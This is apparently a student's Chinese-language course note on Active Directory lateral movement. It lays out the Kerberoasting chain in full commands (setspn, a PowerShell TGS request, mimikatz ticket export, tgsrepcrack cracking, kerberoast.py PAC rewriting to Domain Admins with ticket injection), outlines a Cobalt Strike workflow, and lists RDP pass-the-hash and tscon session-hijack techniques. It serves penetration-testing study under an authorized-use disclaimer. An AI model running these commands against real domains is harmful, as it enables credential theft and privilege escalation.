# 2026-09-01 内网安全⑤：域横向移动——SPN 服务（Kerberoast：探针/请求/破解/重写）+ Cobalt Strike 初体验 + RDP 横向

> 状态：🧪 理论（课程截图，09-01 课程），待实操
> 承接 08-31 内网安全④：上节课讲 PTT 票据注入（怎么把票据塞进内存），这节课讲**票据从哪来、怎么伪造**——SPN 服务票据（Kerberoast：探针→请求→导出→破解→重写），外加 Cobalt Strike（域横向"一把梭哈"集成框架）和 RDP 横向（导图第 5 类 winrs&winrm&rdp 的 rdp 分支）。
> ⚠️ RDP 部分课程截图未包含，按标准知识补充，待对照课程验证。

## 一、一句话认知

**Kerberoast** = 找域里注册了 SPN 的服务账号（MSSQL/WSMAN/Exchange…），**用普通域用户的 TGT 向 KDC 请求服务票据（TGS）**，票据是用**服务账号的 NTLM hash（RC4_HMAC_MD5）**加密的 → **离线破解 TGS 得到服务账号明文密码/hash** → 拿到服务账号权限或**重写票据（银票据）**冒充任意用户。本质：**域内任何能请求票据的普通用户，都能把服务账号的密码"拿回家"慢慢破**。

## 二、案例2：SPN 服务横向——Kerberoast 五步流程

### 导图总览

```
SPN
├── 流程：探针SPN服务 → 请求服务票据 → 导出服务票据 → 破解服务票据 → 重写服务票据
└── 服务：MSSQL / WSMAN / Exchange / TERMSERV / Hyper-V Host / （第六个截图截断）
```

- **SPN（Service Principal Name）**：服务在域里的唯一标识（如 `MSSQLSvc/Srv-DB-0day.0day.org:1433`），域控用 SPN 定位服务；注册了 SPN 的**域用户账号**密码越弱越危险
- 常见服务：MSSQL（MSSQLSvc）、WSMAN（WinRM）、Exchange、TERMSERV（RDP 服务）、Hyper-V Host

### Kerberoast 原理（课程原文 + 白话）

> 黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC 在活动目录中查找 SPN，并使用与 SPN 关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的 Kerberos 服务票证的加密类型是 **RC4_HMAC_MD5**，这意味着**服务帐户的 NTLM 密码哈希用于加密服务票证**。黑客将收到的 TGS 票据离线进行破解，即可得到目标服务帐号的 HASH，这个称之为 **Kerberoast 攻击**。如果我们有一个为域用户帐户注册的任意 SPN，那么该用户帐户的明文密码的 NTLM 哈希值就将用于创建服务票证。这就是 Kerberoasting 攻击的关键。

白话拆解：**请求票据是免费的**（任何域用户都能请求 TGS），但**票据是服务账号 hash 加密的**——等于服务账号把"密码指纹"亲手交到你手里，你拿回家离线爆破就行。服务账号往往密码简单/长期不变（为了服务自动启动），所以破起来效率高。

### ① 探针 SPN 服务

```cmd
setspn -q */*                              # 查询域内所有 SPN
setspn -q */* | findstr "MSSQL"            # 过滤：只找 MSSQL 服务的 SPN（高亮命令）
```

### ② 请求服务票据（PowerShell 请求目标 SPN 的 TGS）

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"   # xxxx = 目标 SPN（如 MSSQLSvc/Srv-DB-0day.0day.org:1433）
```

### ③ 导出服务票据（mimikatz）

```cmd
mimikatz.exe "kerberos::ask /target:xxxx"    # 直接向 KDC 请求目标 SPN 的服务票据
mimikatz.exe "kerberos::list /export"        # 列出并导出票据（.kirbi 文件）
```

### ④ 破解服务票据（离线爆破 TGS → 服务账号明文/hash）

```cmd
python tgsrepcrack.py passwd.txt xxxx.kirbi     # 模板：字典文件 + 导出的票据
python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry3@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi   # 实例：jerry3 账号的 MSSQL 服务票据
```

- 票据文件名自带信息：`jerry3@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi` = 服务账号 jerry3、服务类型 MSSQLSvc、主机 Srv-DB-0day.0day.org、端口 1433、域 0DAY.ORG
- 破解原理：RC4_HMAC_MD5 加密的 TGS = 服务账号 NTLM hash 加密 → 字典里每个密码算一遍 NTLM 尝试解密票据，命中即得明文

### ⑤ 重写服务票据（伪造票据 → 银票据思路）

```cmd
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500    # -u 500：把票据 PAC 改成 RID 500（administrator）
python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512    # -g 512：把票据 PAC 加入 RID 512（Domain Admins 组）
mimikatz.exe kerberos::ptt xxxx.kirbi     # 将生成的票据注入内存
```

- 拿到服务账号密码后，用 `kerberoast.py` **重写服务票据的 PAC**（-u 指定用户 RID / -g 指定组 RID），生成的新票据 ptt 注入内存 = **银票据（Silver Ticket）**——伪造对某个服务的访问身份
- -u 500 = administrator（本地管理员 RID）、-g 512 = Domain Admins（域管组 RID）——改成域管组就能以域管身份访问该服务
- 参考文章：https://www.cnblogs.com/backlion/p/8082623.html（Kerberoast 详解）

### 小结：Kerberoast 攻击链

```
setspn 探针 → PowerShell 请求 TGS → mimikatz 导出 .kirbi → tgsrepcrack 离线破解 → 服务账号明文
                                                                    ↓（已拿到密码）
                                                kerberoast.py 重写 PAC(-u 500/-g 512) → ptt 注入 = 银票据
```

## 三、案例3：Cobalt Strike 初体验——域横向测试"一把梭哈"

> #案例3-域横向移动测试流程—一把梭哈-Cobalt Strike初体验
> 参考：【腾讯文档】第五十二天：Cobalt Strike 使用指南 https://docs.qq.com/doc/DZ1VaY3dzWlpRZ1h3

**大概流程**：启动 → 配置 → 监听 → 执行 → 上线 → 提权 → 信息收集（网络，凭证，定位等）→ 渗透

课程四个讲解点（只给了框架）：
1. 关于启动及配置讲解（团队服务器 + 客户端启动、profile 配置）
2. 关于提权及插件加载（提权模块 + 插件市场/自定义插件）
3. 关于信息收集命令讲解（网络/凭证/定位等内置命令）
4. 关于视图自动化功能讲解（目标视图/会话管理/自动化）

- 定位：**红队 C2（命令与控制）框架**——把「启动→上线→提权→信息收集→渗透」整个域横向流程串起来，和上节课 Ladon（信息收集/扫描集成）互补：Ladon 偏侦察扫描，CS 偏**会话控制 + 横向联动**
- 课程只演示流程框架，具体命令待对照腾讯文档参考（❓）

## 四、RDP 横向（标准知识补充，课程截图未包含，待对照）

> 导图「传递」第 5 类 winrs&winrm&rdp 的 rdp 分支。RDP = 远程桌面，端口 3389。

| 手法 | 命令/要点 | 前提 |
|------|----------|------|
| 明文连接 | `mstsc /v:IP` 图形登录；或 `cmdkey /add:IP /user:域\用户 /pass:密码` + `mstsc /v:IP` 免输密码 | 有明文凭据 |
| 哈希传递 RDP（Restricted Admin） | 目标机开受限管理员模式（注册表 `HKLM\System\CurrentControlSet\Control\Lsa` 的 `DisableRestrictedAdmin`=0）→ mimikatz `sekurlsa::pth /user:x /domain:god /ntlm:<hash>` → `mstsc /restrictedadmin` | 打了 KB2871997 后 PTH 仍可走 RDP 受限模式 |
| 会话劫持（RDP Hijack） | 管理员权限下 `tscon <会话ID> /dest:<当前会话名>`——把别人的桌面会话踢到自己这边 | 管理员/SYSTEM |
| 撞库/爆破 | 3389 开放 + 口令字典（配合内网横向批量撞） | 有字典/凭据 |

- 特点：RDP 是**图形化**横向（相对 SMB/WMI 的命令行），交互痕迹明显；服务横向搞不定图形需求时用（比如要操作目标桌面/带 GUI 的应用）

## 五、总结：内网安全⑤地图

| 板块 | 内容 |
|------|------|
| 案例2 SPN/Kerberoast | 五步：setspn 探针 → PowerShell 请求 TGS → mimikatz 导出 → tgsrepcrack 破解 → kerberoast.py 重写（银票据 -u 500/-g 512）+ ptt 注入 |
| 原理 | TGS 用服务账号 NTLM hash（RC4_HMAC_MD5）加密，请求免费 → 离线爆破；服务账号密码弱是核心 |
| 案例3 Cobalt Strike | 一把梭哈：启动-配置-监听-上线-提权-信息收集-渗透；四个讲解点（启动配置/提权插件/信息收集/视图自动化） |
| RDP 横向 | 明文 mstsc / Restricted Admin PTH / tscon 会话劫持 / 爆破 |

**一句话串起来**：SPN 服务横向 = **把服务账号的密码"借"出来**（Kerberoast 五步，票据请求免费+离线破解）；Cobalt Strike = **把整个横向流程"管"起来**（会话/提权/信息收集一体化）；RDP = **图形化兜底**。至此导图「传递」5 类全部展开：at&schtasks、psexec&smbexec、wmic&wmiexec、PTH&PTT&PTK、winrs&winrm&rdp（winrs/winrm 尚未细讲，❓）。

## 疑问

1. ❓ Kerberoast 的「重写」（kerberoast.py -u/-g）就是银票据（Silver Ticket）吗？和 MS14-068 伪造的 TGT（金票据思路）区别？
2. ❓ tgsrepcrack 破解的是什么 hash 类型？（rc4_hmac_md5 TGS → hashcat 模式 13100？）
3. ❓ 请求 TGS 需要什么权限？（普通域用户即可？被请求服务账号有没有限制？）
4. ❓ setspn 探针到的 SPN 怎么对应到服务账号名？（SPN → 账号的映射查询：setspn -q 还是 AD 查询？）
5. ❓ winrs/winrm 横向的具体手法？（导图第 5 类只剩它没展开）
6. ❓ RDP 的 Restricted Admin 模式在哪些系统版本可用？（Win8.1/2012R2+？）
7. ❓ Cobalt Strike 具体操作命令？（启动/配置/监听器/上线/提权/信息收集的对应命令）——待对照腾讯文档

## 关联笔记

- [2026-08-31-内网安全-域横向移动PTH-PTK-PTT哈希票据传递.md](./2026-08-31-内网安全-域横向移动PTH-PTK-PTT哈希票据传递.md) — PTT 票据注入是本课 ptt 环节的实操基础；MS14-068 伪造 TGT vs 本课银票据
- [2026-08-31-内网安全-域横向移动SMB与WMI传递.md](./2026-08-31-内网安全-域横向移动SMB与WMI传递.md) — SMB/WMI 服务横向 + 工具选型（服务协议横向全家桶）
- [2026-08-30(续2)-内网安全-域横向渗透.md](./2026-08-30(续2)-内网安全-域横向渗透.md) — 导图总览：本课展开 SPN 分支 + 案例3 CS（导图外新增）
- [2026-08-30(续)-内网安全-基本认知与信息收集.md](./2026-08-30(续)-内网安全-基本认知与信息收集.md) — 域环境/凭据收集（Kerberoast 前提：有效域用户 TGT）

## 待实践

- 实验环境跑 Kerberoast 五步：setspn 探针（先全量再 findstr MSSQL）→ PowerShell 请求 → mimikatz 导出 → tgsrepcrack 破解（准备 password.txt）
- 破解成功后 kerberoast.py 重写 -u 500 / -g 512 各一遍 → ptt 注入 → dir 验证
- 观察票据文件名格式（jerry3@MSSQLSvc~主机~1433-域名）并对照服务账号
- Cobalt Strike 按腾讯文档参考搭一遍流程（启动-配置-监听-上线-提权-信息收集）
- RDP 三手法各验证：明文 mstsc / Restricted Admin PTH / tscon 劫持（如有图形条件）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
